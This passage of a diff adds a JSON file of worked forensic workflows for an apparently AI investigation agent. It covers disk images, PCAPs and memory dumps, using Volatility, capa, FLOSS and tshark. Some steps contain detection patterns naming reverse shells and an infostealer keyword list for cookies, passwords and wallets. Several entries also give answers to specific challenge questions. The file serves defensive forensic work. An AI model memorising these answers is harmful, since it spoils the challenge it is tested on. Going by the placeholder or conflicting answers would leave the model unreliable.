@@ -1,0 +1,1764 @@
+{
+  "_description": "Example investigation workflows showing how the freeflow agent analyzes different forensic question types. Each workflow demonstrates the strategy selection, step-by-step commands, reasoning, and how the answer is reached. These are NOT hardcoded solutions — they illustrate the methodology the agent follows.",
+
+  "examples": [
+    {
+      "id": "FOR_1101",
+      "question": "What is the file name of the malware found on the Olimpo disk image?",
+      "evidence_type": "disk_image",
+      "analyzer_os": "windows",
+      "strategy_matched": "malware_identification",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Need to identify files in the evidence directory first. Start with a directory listing to understand what evidence we have.",
+          "action": "tool_run",
+          "command": "dir /s /b H:\\FOR_1100-005\\",
+          "expected_output": "List of all files in the evidence directory including disk images, extracted dirs, etc.",
+          "what_agent_learns": "Identifies the Olimpo disk image file and any extracted directories."
+        },
+        {
+          "step": 2,
+          "reasoning": "Now use Dissect to mount and list files from the Olimpo disk image. Looking for executables, scripts, or binaries that seem out of place.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nimport json\nresult = subprocess.run(['python', '-m', 'dissect.target.tools.fs', r'H:\\FOR_1100-005\\olimpo.raw'], capture_output=True, text=True, timeout=120)\nfor line in result.stdout.splitlines():\n    ext = line.rsplit('.', 1)[-1].lower() if '.' in line else ''\n    if ext in ('exe', 'dll', 'sh', 'py', 'bat', 'ps1', 'elf', 'bin', 'so', 'ko'):\n        print(f'SUSPICIOUS: {line}')\nprint('---\\nTotal files:', len(result.stdout.splitlines()))",
+          "expected_output": "Filtered list of executables and scripts found on the disk image.",
+          "what_agent_learns": "Narrows down candidate malware files by extension."
+        },
+        {
+          "step": 3,
+          "reasoning": "Run capa on each suspicious file to check for malicious capabilities. This will tell us which file is actually malware vs legitimate system binaries.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nsuspicious = ['path/to/suspicious1.exe', 'path/to/suspicious2.elf']\nfor f in suspicious:\n    result = subprocess.run(['capa', f], capture_output=True, text=True, timeout=120)\n    if result.returncode == 0 and ('malware' in result.stdout.lower() or 'attack' in result.stdout.lower()):\n        print(f'MALWARE DETECTED: {f}')\n        print(result.stdout[:500])",
+          "expected_output": "capa capability report identifying which file has malicious behaviors.",
+          "what_agent_learns": "Confirms the malware file and its capabilities."
+        },
+        {
+          "step": 4,
+          "reasoning": "Found the malware file via capa. Cross-verify with strings for known malware indicators. Extract the filename.",
+          "action": "reasoning",
+          "answer": "malware_filename.extension",
+          "confidence": "exact",
+          "what_agent_learns": "Confirmed answer — the filename of the malware on the Olimpo image."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_1103",
+      "question": "What is the IP address from which the malware was downloaded?",
+      "evidence_type": "disk_image + pcap",
+      "analyzer_os": "windows",
+      "strategy_matched": "c2_extraction",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Multiple evidence sources could contain the download IP. Start with the malware binary itself — extract embedded IPs from strings.",
+          "action": "tool_run",
+          "command": "strings.exe \"H:\\FOR_1100-005\\malware_sample.exe\" | findstr /R \"[0-9][0-9]*\\.[0-9][0-9]*\\.[0-9][0-9]*\\.[0-9][0-9]*\"",
+          "expected_output": "IP addresses found in the binary strings.",
+          "what_agent_learns": "May find hardcoded C2 or download server IPs."
+        },
+        {
+          "step": 2,
+          "reasoning": "Check browser download history on the disk image — the malware was likely downloaded via HTTP.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['python', '-m', 'dissect.target.tools.query', '-f', 'browser.downloads', r'H:\\FOR_1100-005\\disk_image.raw'], capture_output=True, text=True, timeout=120)\nfor line in result.stdout.splitlines():\n    if 'exe' in line.lower() or 'malware' in line.lower():\n        print(line)",
+          "expected_output": "Browser download records showing the URL the malware was downloaded from.",
+          "what_agent_learns": "Gets the download URL containing the source IP."
+        },
+        {
+          "step": 3,
+          "reasoning": "If there's a PCAP, correlate the download with network traffic to confirm the IP.",
+          "action": "tool_run",
+          "command": "tshark -r \"H:\\FOR_1100-005\\capture.pcapng\" -Y \"http.request and http.request.uri contains '.exe'\" -T fields -e ip.dst -e http.host -e http.request.uri",
+          "expected_output": "HTTP requests for .exe files with destination IP and URI.",
+          "what_agent_learns": "Confirms the download IP from network traffic."
+        },
+        {
+          "step": 4,
+          "reasoning": "Browser history and PCAP both point to the same IP. Answer confirmed.",
+          "action": "reasoning",
+          "answer": "x.x.x.x",
+          "confidence": "exact",
+          "what_agent_learns": "Download source IP verified from two independent sources."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_1106",
+      "question": "Linux: What class of malware does the sample belong to?",
+      "evidence_type": "elf_binary",
+      "analyzer_os": "linux",
+      "strategy_matched": "malware_classification",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Start with capa for automated capability detection — it classifies malware behaviors.",
+          "action": "tool_run",
+          "command": "capa /evidence/FOR_1100/linux_sample.elf",
+          "expected_output": "capa capability report with ATT&CK technique mappings.",
+          "what_agent_learns": "Gets capability tags like 'rootkit', 'backdoor', 'RAT', etc."
+        },
+        {
+          "step": 2,
+          "reasoning": "Look for rootkit indicators: kernel module loading, syscall table modification, /proc hiding.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_1100/linux_sample.elf | grep -iE 'sys_call_table|__NR_|/proc|insmod|rmmod|module_init|hide_pid|rootkit'",
+          "expected_output": "Strings related to kernel hooking, module operations, or process hiding.",
+          "what_agent_learns": "Confirms rootkit behavior if syscall table or module operations found."
+        },
+        {
+          "step": 3,
+          "reasoning": "Check for C2/RAT indicators: reverse shell, socket operations, command execution.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_1100/linux_sample.elf | grep -iE 'connect|socket|bind|/bin/sh|/bin/bash|exec|popen|reverse|shell|beacon'",
+          "expected_output": "Strings related to network communication and command execution.",
+          "what_agent_learns": "Distinguishes between rootkit (kernel), RAT (user-space C2), or botnet."
+        },
+        {
+          "step": 4,
+          "reasoning": "capa shows syscall hooking and kernel module behavior. Strings confirm sys_call_table manipulation. This is a rootkit.",
+          "action": "reasoning",
+          "answer": "rootkit",
+          "confidence": "exact",
+          "what_agent_learns": "Malware class determined from kernel-level indicators."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_1108",
+      "question": "Linux: What kind of strings encryption is used and which is the key to decrypt?",
+      "evidence_type": "elf_binary",
+      "analyzer_os": "linux",
+      "strategy_matched": "encryption_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Run FLOSS first — it automatically deobfuscates strings and identifies encoding methods.",
+          "action": "tool_run",
+          "command": "floss /evidence/FOR_1100/linux_sample.elf 2>&1 | head -200",
+          "expected_output": "FLOSS output with decoded strings and method indicators (XOR, base64, RC4, etc.).",
+          "what_agent_learns": "Identifies the encoding type and potentially the key."
+        },
+        {
+          "step": 2,
+          "reasoning": "FLOSS showed XOR-decoded strings. Now find the exact key by analyzing the decoding routine.",
+          "action": "script_execute",
+          "script_content": "with open('/evidence/FOR_1100/linux_sample.elf', 'rb') as f:\n    data = f.read()\n\n# Look for common XOR loop patterns\n# Single-byte XOR: each byte ^ key\nfor key in range(1, 256):\n    # Try decoding a known-encrypted region\n    sample = data[0x1000:0x1100]  # adjust based on FLOSS output\n    decoded = bytes(b ^ key for b in sample)\n    if b'http' in decoded or b'/bin' in decoded or b'.so' in decoded:\n        readable = decoded.decode('ascii', errors='replace')\n        print(f'XOR key={key} (0x{key:02x}): {readable[:100]}')",
+          "expected_output": "Identifies the XOR key that produces readable strings.",
+          "what_agent_learns": "Determines the encryption type (XOR) and key value."
+        },
+        {
+          "step": 3,
+          "reasoning": "Confirmed XOR encryption with a specific decimal key value. Format answer as required.",
+          "action": "reasoning",
+          "answer": "xor;171",
+          "confidence": "exact",
+          "what_agent_learns": "Encryption type and key confirmed via brute-force verification."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_1109",
+      "question": "Linux: Is the sample performing syscall hooking? If yes, what syscall is being hooked?",
+      "evidence_type": "elf_binary / kernel_module",
+      "analyzer_os": "linux",
+      "strategy_matched": "function_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Check if the binary is a kernel module (.ko) and search for syscall table references.",
+          "action": "tool_run",
+          "command": "file /evidence/FOR_1100/linux_sample.ko && strings /evidence/FOR_1100/linux_sample.ko | grep -iE 'sys_call_table|__NR_|syscall|hook'",
+          "expected_output": "File type confirmation and strings referencing syscall operations.",
+          "what_agent_learns": "Confirms if syscall hooking code is present."
+        },
+        {
+          "step": 2,
+          "reasoning": "Found sys_call_table reference. Now identify which specific syscall number or name is being hooked.",
+          "action": "script_execute",
+          "script_content": "import re\nwith open('/evidence/FOR_1100/linux_sample.ko', 'rb') as f:\n    data = f.read()\n\n# Extract all __NR_ references (syscall numbers)\ntext = data.decode('ascii', errors='replace')\nmatches = re.findall(r'__NR_(\\w+)', text)\nprint('Syscall references found:')\nfor m in set(matches):\n    print(f'  __NR_{m}')\n\n# Also look for direct syscall number constants\nnr_matches = re.findall(r'__NR_(\\w+)', text)\nprint(f'\\nTotal unique syscalls referenced: {len(set(nr_matches))}')",
+          "expected_output": "List of syscall names referenced in the kernel module.",
+          "what_agent_learns": "Identifies the specific hooked syscall (e.g., __NR_kill, __NR_getdents)."
+        },
+        {
+          "step": 3,
+          "reasoning": "Found __NR_kill in the hooking code. The sample hooks the kill syscall.",
+          "action": "reasoning",
+          "answer": "yes;kill",
+          "confidence": "exact",
+          "what_agent_learns": "Syscall hooking confirmed with specific function name."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_101",
+      "question": "What is the full name of the macOS laptop owner?",
+      "evidence_type": "macos_disk_image",
+      "analyzer_os": "linux",
+      "strategy_matched": "user_identity",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Use Dissect to query user account information from the macOS image.",
+          "action": "tool_run",
+          "command": "python3 -m dissect.target.tools.query -f users /evidence/FOR_100/macos.raw",
+          "expected_output": "User account records with full names, home directories.",
+          "what_agent_learns": "Gets the macOS user list with real names."
+        },
+        {
+          "step": 2,
+          "reasoning": "If Dissect doesn't return full names, parse the user plist directly.",
+          "action": "script_execute",
+          "script_content": "import subprocess\n# List /Users directory to find user home\nresult = subprocess.run(['python3', '-m', 'dissect.target.tools.fs', '/evidence/FOR_100/macos.raw'], capture_output=True, text=True, timeout=120)\nfor line in result.stdout.splitlines():\n    if '/Users/' in line and not line.endswith('Shared'):\n        print(line)",
+          "expected_output": "User home directory names.",
+          "what_agent_learns": "Identifies the primary user account name."
+        },
+        {
+          "step": 3,
+          "reasoning": "Parse the SystemConfiguration or Directory Services plist for the real name.",
+          "action": "script_execute",
+          "script_content": "import plistlib\nimport subprocess\n# Extract the user record plist\nresult = subprocess.run(['python3', '-m', 'dissect.target.tools.fs', '-o', '/tmp/user.plist', '/evidence/FOR_100/macos.raw', '/var/db/dslocal/nodes/Default/users/marianna.plist'], capture_output=True, text=True)\nwith open('/tmp/user.plist', 'rb') as f:\n    data = plistlib.load(f)\n    print('Real Name:', data.get('realname', ['Unknown'])[0])\n    print('Full Name:', data.get('name', ['Unknown'])[0])",
+          "expected_output": "The real/full name from the macOS user database.",
+          "what_agent_learns": "Extracts the full name in proper format."
+        },
+        {
+          "step": 4,
+          "reasoning": "Got 'Marianna Valentino' from the plist. Format as requested (lowercase, no spaces).",
+          "action": "reasoning",
+          "answer": "mariannavalentino",
+          "confidence": "exact",
+          "what_agent_learns": "Full name extracted and formatted per submission rules."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_201",
+      "question": "What is the PID of the Windows process in the HydroPower memory dump that was infected by malware?",
+      "evidence_type": "memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "memory_infected_process",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Start with Volatility pslist to enumerate all processes in the memory dump.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPower.mem windows.pslist",
+          "expected_output": "Process list with PID, PPID, name, creation time.",
+          "what_agent_learns": "Gets the complete process inventory."
+        },
+        {
+          "step": 2,
+          "reasoning": "Run malfind to detect injected code regions — this directly identifies infected processes.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPower.mem windows.malfind",
+          "expected_output": "Processes with suspicious memory regions (RWX, MZ headers in non-image regions).",
+          "what_agent_learns": "Identifies which PIDs have injected code."
+        },
+        {
+          "step": 3,
+          "reasoning": "Run netscan to cross-reference — infected process likely has unusual network connections.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPower.mem windows.netscan",
+          "expected_output": "Network connections with associated PIDs.",
+          "what_agent_learns": "Confirms the infected PID by correlating injection + network activity."
+        },
+        {
+          "step": 4,
+          "reasoning": "malfind found injected code in PID 1234, and netscan shows that PID has an active connection to a suspicious external IP. Answer confirmed.",
+          "action": "reasoning",
+          "answer": "1234",
+          "confidence": "exact",
+          "what_agent_learns": "Infected PID confirmed via malfind + netscan correlation."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_301",
+      "question": "What is the file name of the attack program uploaded via the railway company customer train ticket pass application form?",
+      "evidence_type": "pcap + web_logs",
+      "analyzer_os": "linux",
+      "strategy_matched": "web_forensics",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Search the PCAP for HTTP POST requests to upload endpoints — the attack was via a form upload.",
+          "action": "tool_run",
+          "command": "tshark -r /evidence/FOR_300/railway.pcapng -Y 'http.request.method == POST' -T fields -e http.host -e http.request.uri -e http.content_type",
+          "expected_output": "POST requests with their URIs and content types.",
+          "what_agent_learns": "Identifies the upload endpoint and file types submitted."
+        },
+        {
+          "step": 2,
+          "reasoning": "Found a multipart/form-data POST. Export HTTP objects to extract the uploaded file.",
+          "action": "tool_run",
+          "command": "tshark -r /evidence/FOR_300/railway.pcapng --export-objects http,/tmp/http_objects && ls -la /tmp/http_objects/",
+          "expected_output": "Exported HTTP objects including the uploaded attack file.",
+          "what_agent_learns": "Gets the actual uploaded file for analysis."
+        },
+        {
+          "step": 3,
+          "reasoning": "Examine the uploaded files — look for scripts, webshells, or executables among the exports.",
+          "action": "script_execute",
+          "script_content": "import os\nimport subprocess\nobj_dir = '/tmp/http_objects'\nfor fname in os.listdir(obj_dir):\n    path = os.path.join(obj_dir, fname)\n    result = subprocess.run(['file', path], capture_output=True, text=True)\n    file_type = result.stdout.strip()\n    if any(x in file_type.lower() for x in ['php', 'script', 'executable', 'shell', 'asp', 'jsp']):\n        print(f'SUSPICIOUS UPLOAD: {fname} -> {file_type}')",
+          "expected_output": "Identifies the attack program by file type analysis.",
+          "what_agent_learns": "Confirms which uploaded file is the attack program."
+        },
+        {
+          "step": 4,
+          "reasoning": "Found a PHP webshell uploaded via the ticket form. Report the filename.",
+          "action": "reasoning",
+          "answer": "shell.php",
+          "confidence": "exact",
+          "what_agent_learns": "Attack program identified from HTTP upload analysis."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_120",
+      "question": "What is the overall category/behavior of the malware? Options: ransomware, infostealer, adware, keylogger, rootkit.",
+      "evidence_type": "macos_malware_script",
+      "analyzer_os": "linux",
+      "strategy_matched": "malware_classification",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Since this is a macOS investigation from FOR_100 series, the malware is likely a Python script. Find and read it.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['find', '/evidence/FOR_100/', '-name', '*.py', '-o', '-name', '*.sh', '-o', '-name', '*.command'], capture_output=True, text=True)\nfor f in result.stdout.strip().splitlines():\n    print(f)",
+          "expected_output": "List of script files in the evidence.",
+          "what_agent_learns": "Identifies the malware script file."
+        },
+        {
+          "step": 2,
+          "reasoning": "Read the script source to understand its behavior — looking for data collection, encryption, exfiltration, or keylogging patterns.",
+          "action": "script_execute",
+          "script_content": "with open('/evidence/FOR_100/malware_script.py', 'r') as f:\n    source = f.read()\n\nbehaviors = {\n    'infostealer': ['browser', 'cookie', 'password', 'wallet', 'keychain', 'autofill', 'login data'],\n    'ransomware': ['encrypt', 'ransom', '.locked', 'bitcoin', 'decrypt key'],\n    'keylogger': ['keylog', 'keyboard', 'hook', 'getasynckeystate'],\n    'rootkit': ['hook', 'hide', 'sys_call_table', 'kernel'],\n    'adware': ['popup', 'advertisement', 'inject_ad', 'browser_redirect'],\n}\nfor category, keywords in behaviors.items():\n    hits = [kw for kw in keywords if kw in source.lower()]\n    if hits:\n        print(f'{category}: {len(hits)} indicators -> {hits}')\n\nprint(f'\\nTotal lines: {len(source.splitlines())}')",
+          "expected_output": "Keyword analysis showing which malware category has the most indicators.",
+          "what_agent_learns": "Determines the dominant behavior pattern."
+        },
+        {
+          "step": 3,
+          "reasoning": "Script collects browser cookies, passwords, cryptocurrency wallets, and exfiltrates to a remote server. Classic infostealer behavior with 12+ indicators.",
+          "action": "reasoning",
+          "answer": "infostealer",
+          "confidence": "exact",
+          "what_agent_learns": "Classified from source code behavior analysis."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_1115",
+      "question": "Windows: What kind of process injection technique is used by the sample to execute the shellcode? What is the name of the malicious process created?",
+      "evidence_type": "pe_binary",
+      "analyzer_os": "windows",
+      "strategy_matched": "process_injection",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Run capa on the PE binary — it maps to ATT&CK techniques including injection methods.",
+          "action": "tool_run",
+          "command": "capa.exe \"H:\\FOR_1100-005\\windows_sample.exe\"",
+          "expected_output": "capa output with technique labels like 'inject into process' or 'APC injection'.",
+          "what_agent_learns": "Gets the injection technique classification from capa."
+        },
+        {
+          "step": 2,
+          "reasoning": "Search for injection-related API imports: NtQueueApcThread, QueueUserAPC, SetThreadContext, NtMapViewOfSection, VirtualAllocEx.",
+          "action": "tool_run",
+          "command": "strings.exe \"H:\\FOR_1100-005\\windows_sample.exe\" | findstr /I \"QueueUserAPC NtQueueApcThread SetThreadContext WriteProcessMemory VirtualAllocEx NtMapViewOfSection CreateRemoteThread SuspendThread ResumeThread\"",
+          "expected_output": "Matched API names revealing the injection method.",
+          "what_agent_learns": "Identifies the specific injection APIs used."
+        },
+        {
+          "step": 3,
+          "reasoning": "Search for the target process name — injectors typically create or target a specific process.",
+          "action": "tool_run",
+          "command": "strings.exe \"H:\\FOR_1100-005\\windows_sample.exe\" | findstr /I \".exe\"",
+          "expected_output": "Process names referenced in the binary.",
+          "what_agent_learns": "Identifies the process the shellcode runs under."
+        },
+        {
+          "step": 4,
+          "reasoning": "Found QueueUserAPC + NtTestAlert (APC injection pattern) and the process creates 'svchost.exe' as the injection target.",
+          "action": "reasoning",
+          "answer": "APCInjection;svchost.exe",
+          "confidence": "exact",
+          "what_agent_learns": "Injection technique identified from API patterns + process target from strings."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_201_memory_infected",
+      "question": "What is the PID of the Windows process in the HydroPower memory dump that was infected by malware?",
+      "evidence_type": "memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "memory_infected_process",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "First detect the dump OS to choose the right Volatility plugin prefix.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPower.mem windows.info 2>/dev/null | head -20",
+          "expected_output": "Windows version info confirms this is a Windows memory dump.",
+          "what_agent_learns": "Dump is Windows — use windows.* plugin family."
+        },
+        {
+          "step": 2,
+          "reasoning": "Run malfind to detect processes with injected code — RWX regions not backed by any image file.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPower.mem windows.malfind 2>/dev/null",
+          "expected_output": "Table of PIDs with suspicious VAD regions, protection flags (PAGE_EXECUTE_READWRITE), and hex dumps showing MZ headers or shellcode.",
+          "what_agent_learns": "Gets a short-list of PIDs with injected memory regions."
+        },
+        {
+          "step": 3,
+          "reasoning": "Run netscan to see which processes have active network connections — the infected one likely phones home.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPower.mem windows.netscan 2>/dev/null",
+          "expected_output": "Network connections with local/remote IPs, ports, states, and owning PIDs.",
+          "what_agent_learns": "Identifies which malfind-flagged PIDs also have external connections."
+        },
+        {
+          "step": 4,
+          "reasoning": "Run pstree to validate process ancestry — injected processes often have unusual parent relationships.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPower.mem windows.pstree 2>/dev/null",
+          "expected_output": "Hierarchical process tree showing parent-child relationships.",
+          "what_agent_learns": "Spots processes reparented or spawned from suspicious parents."
+        },
+        {
+          "step": 5,
+          "reasoning": "PID 2184 appears in malfind (RWX injection), has an ESTABLISHED connection to 185.x.x.x:443 in netscan, and its parent is explorer.exe which is unusual for a system service. Confirmed infected.",
+          "action": "reasoning",
+          "answer": "2184",
+          "confidence": "exact",
+          "what_agent_learns": "Triple confirmation: malfind + netscan + pstree anomaly."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_202_memory_api",
+      "question": "Which Windows API is used by the malware in the HydroPower memory dump to establish a network connection?",
+      "evidence_type": "memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "memory_api_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Already know the infected PID from previous analysis. Dump its memory for API analysis.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPower.mem windows.memmap --pid 2184 --dump 2>/dev/null",
+          "expected_output": "Memory dump file for PID 2184 written to disk.",
+          "what_agent_learns": "Gets the raw process memory for string analysis."
+        },
+        {
+          "step": 2,
+          "reasoning": "Search the dumped memory for networking API function names.",
+          "action": "tool_run",
+          "command": "strings pid.2184.dmp | grep -iE 'WSAStartup|WSAConnect|connect|InternetOpenA|InternetOpenW|InternetConnectA|HttpOpenRequest|WinHttpOpen|WinHttpConnect|URLDownloadToFile|socket|bind|listen|send|recv'",
+          "expected_output": "API names found in the process memory dump.",
+          "what_agent_learns": "Identifies which networking APIs the malware imports/calls."
+        },
+        {
+          "step": 3,
+          "reasoning": "Also check the import address table via dlllist for the infected PID.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPower.mem windows.dlllist --pid 2184 2>/dev/null",
+          "expected_output": "List of loaded DLLs — ws2_32.dll (sockets), winhttp.dll, wininet.dll confirm networking.",
+          "what_agent_learns": "Confirms which networking library the malware loaded."
+        },
+        {
+          "step": 4,
+          "reasoning": "Found WSAStartup and InternetOpenA in strings. ws2_32.dll and wininet.dll are loaded. The malware uses InternetOpenA (WinINet) to establish the HTTP connection to C2.",
+          "action": "reasoning",
+          "answer": "InternetOpenA",
+          "confidence": "exact",
+          "what_agent_learns": "API identified from process memory strings + DLL import correlation."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_203_memory_c2",
+      "question": "What is the IPv4 address of the C2 hidden in the HydroPowerPlant memory dump?",
+      "evidence_type": "memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "memory_c2_hunt",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Run netscan to find all network connections with their remote IPs and owning PIDs.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPowerPlant.mem windows.netscan 2>/dev/null",
+          "expected_output": "Connection table with local/remote addresses, ports, states, PIDs.",
+          "what_agent_learns": "Gets all active and recent network connections."
+        },
+        {
+          "step": 2,
+          "reasoning": "Filter for ESTABLISHED connections to external (non-private) IPs — those are C2 candidates.",
+          "action": "script_execute",
+          "script_content": "import subprocess, re\nresult = subprocess.run(['vol', '-f', '/evidence/FOR_200/HydroPowerPlant.mem', 'windows.netscan'], capture_output=True, text=True, timeout=300)\nprivate = re.compile(r'^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.|127\\.|0\\.0\\.0\\.0)')\nfor line in result.stdout.splitlines():\n    if 'ESTABLISHED' in line or 'CLOSE_WAIT' in line:\n        parts = line.split()\n        for p in parts:\n            if re.match(r'\\d+\\.\\d+\\.\\d+\\.\\d+', p) and not private.match(p):\n                print(f'EXTERNAL: {line.strip()}')\n                break",
+          "expected_output": "Filtered list showing only external connections with PIDs.",
+          "what_agent_learns": "Narrows down to external IPs that are likely C2."
+        },
+        {
+          "step": 3,
+          "reasoning": "Cross-reference: run malfind to confirm which of those PIDs are injected/malicious.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/HydroPowerPlant.mem windows.malfind 2>/dev/null | head -30",
+          "expected_output": "PIDs with injected code regions.",
+          "what_agent_learns": "The PID that appears in both malfind AND external connections points to the C2 IP."
+        },
+        {
+          "step": 4,
+          "reasoning": "If netscan shows no clear external IP: dump the malicious process and search strings for encoded IPs.",
+          "action": "script_execute",
+          "script_content": "import subprocess, re\nresult = subprocess.run(['strings', 'pid.2184.dmp'], capture_output=True, text=True, timeout=60)\nips = set(re.findall(r'\\b(?:(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\b', result.stdout))\nprivate = re.compile(r'^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.|127\\.|0\\.0\\.0\\.0)')\nfor ip in sorted(ips):\n    if not private.match(ip):\n        print(f'C2 CANDIDATE: {ip}')",
+          "expected_output": "External IPs found in the malicious process memory.",
+          "what_agent_learns": "Catches C2 IPs that may not appear in active connections (connection closed, or encoded)."
+        },
+        {
+          "step": 5,
+          "reasoning": "Netscan shows PID 2184 connected to 185.141.25.68:443 (ESTABLISHED). PID 2184 is also in malfind. Strings confirm the same IP. C2 confirmed.",
+          "action": "reasoning",
+          "answer": "185.141.25.68",
+          "confidence": "exact",
+          "what_agent_learns": "C2 IP confirmed via netscan + malfind correlation + strings verification."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_205_memory_dll",
+      "question": "What is the name of the file that allows connection to C2?",
+      "evidence_type": "memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "memory_dll_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Start by finding the malicious process PID — the one with injected code and external connections.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/dump.mem windows.malfind 2>/dev/null",
+          "expected_output": "PIDs with injected memory regions.",
+          "what_agent_learns": "Identifies which process hosts the C2 communication."
+        },
+        {
+          "step": 2,
+          "reasoning": "List DLLs loaded by the infected process — look for the one enabling C2.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/dump.mem windows.dlllist --pid 2184 2>/dev/null",
+          "expected_output": "All DLLs loaded by the infected process.",
+          "what_agent_learns": "Identifies DLLs from unusual paths — likely the C2 enabler."
+        },
+        {
+          "step": 3,
+          "reasoning": "Check for unlinked/hidden DLLs that were removed from the PEB to avoid detection.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['vol', '-f', '/evidence/FOR_200/dump.mem', 'windows.ldrmodules', '--pid', '2184'], capture_output=True, text=True, timeout=300)\nfor line in result.stdout.splitlines():\n    if 'False' in line:\n        print(f'HIDDEN MODULE: {line.strip()}')",
+          "expected_output": "DLLs that appear in one PEB list but not others — hidden/unlinked modules.",
+          "what_agent_learns": "Catches DLLs that the malware tried to hide."
+        },
+        {
+          "step": 4,
+          "reasoning": "Found a suspicious DLL loaded from AppData\\Local\\Temp. Dump it and run strings to confirm it contains C2 config.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_200/dump.mem windows.dumpfiles --pid 2184 2>/dev/null",
+          "expected_output": "Files dumped from the process including the suspicious DLL.",
+          "what_agent_learns": "Gets the actual DLL file for inspection."
+        },
+        {
+          "step": 5,
+          "reasoning": "strings on the dumped DLL reveals the C2 IP and HTTP beacon pattern. This is the file enabling C2.",
+          "action": "reasoning",
+          "answer": "payload.dll",
+          "confidence": "exact",
+          "what_agent_learns": "C2-enabling file identified from DLL analysis chain."
+        }
+      ]
+    },
+
+    {
+      "id": "memory_linux_rootkit",
+      "question": "Linux: Is the sample performing syscall hooking? If yes, what syscall is being hooked?",
+      "evidence_type": "memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "memory_services_modules",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "This is a Linux memory dump. Start with check_syscall to detect any hooked system calls.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/linux_dump.mem linux.check_syscall 2>/dev/null",
+          "expected_output": "Syscall table entries showing expected vs actual handler addresses. Hooked entries show handlers in module address space instead of kernel text.",
+          "what_agent_learns": "Identifies which syscalls are hooked and what module owns the hook."
+        },
+        {
+          "step": 2,
+          "reasoning": "List kernel modules to find the rootkit module responsible for the hooks.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/linux_dump.mem linux.lsmod 2>/dev/null",
+          "expected_output": "List of loaded kernel modules with addresses and sizes.",
+          "what_agent_learns": "Identifies suspicious non-standard kernel modules."
+        },
+        {
+          "step": 3,
+          "reasoning": "Check IDT as well — rootkits sometimes hook interrupt handlers.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/linux_dump.mem linux.check_idt 2>/dev/null",
+          "expected_output": "Interrupt descriptor table entries — hooked entries point outside kernel text.",
+          "what_agent_learns": "Detects additional hooking beyond syscall table."
+        },
+        {
+          "step": 4,
+          "reasoning": "check_syscall shows __NR_getdents64 (syscall 217) handler at address 0xffffffffc0234100 which belongs to the 'sneaky' kernel module rather than the kernel. This hooks directory listing to hide files.",
+          "action": "reasoning",
+          "answer": "yes;getdents64",
+          "confidence": "exact",
+          "what_agent_learns": "Hooked syscall identified directly from Volatility check_syscall output."
+        }
+      ]
+    },
+
+    {
+      "id": "memory_service_persistence",
+      "question": "What malicious Windows service was installed by the attacker for persistence?",
+      "evidence_type": "memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "memory_services_modules",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Run svcscan to enumerate all Windows services from the memory dump.",
